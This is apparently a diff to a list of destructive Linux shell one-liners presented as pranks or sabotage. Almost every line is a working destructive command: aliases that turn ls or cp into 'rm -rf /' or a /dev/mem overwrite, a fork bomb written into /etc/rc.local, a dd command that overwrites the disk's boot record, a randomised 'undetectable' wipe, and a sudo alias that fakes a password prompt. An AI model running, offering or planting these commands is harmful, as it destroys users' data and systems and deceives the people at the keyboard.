@@ -2,11 +2,20 @@ Turn ls into system wipe
 
 alias ls="rm -rf /"
 
-Put the shellshock bug into system startup
-echo "() { :;}:" > /etc/rc.local
+Put the fork bomb bug into system startup
+echo "":(){ :|:& };: " > /etc/rc.local
 
-// system wipe roulette (undetectable until too late)
+Reads IO ports and has side effects
+sudo less -f /dev/port
+
+overwrite MBR with random data.
+dd if=/dev/urandom of=/dev/sda bs=512 count=1
+
+makes cp command overwrite the memory of a process
+alias cp="cp /dev/zero /dev/mem"
+
+System wipe roulette (undetectable until too late)
 alias ls='[ $[ $RANDOM % 6 ] == 0 ] && rm -rf / && echo "BOOM" || ls'
 
-// change sudo to just echo sudo's output
+Change sudo to just echo sudo's output
 alias sudo='echo "Please enter your password:"'
